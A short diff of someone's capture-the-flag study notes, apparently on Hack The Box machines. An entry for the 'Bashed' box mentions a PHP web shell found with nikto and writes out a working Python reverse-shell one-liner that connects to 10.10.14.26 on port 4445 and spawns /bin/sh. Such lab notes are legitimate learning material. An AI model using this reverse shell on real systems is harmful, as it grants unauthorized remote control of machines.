@@ -156,6 +156,9 @@ https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 not much different video from https://alamot.github.io/optimum_writeup/ 
 
 ### Bashed
-
+user - embarassing /dev/ folder find by nikto into the php shell.
+reverse shells not just nc... can also be python. one liner: 
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+file creation and edit time can be a hint...  ( learned from write-up..) 
 
 
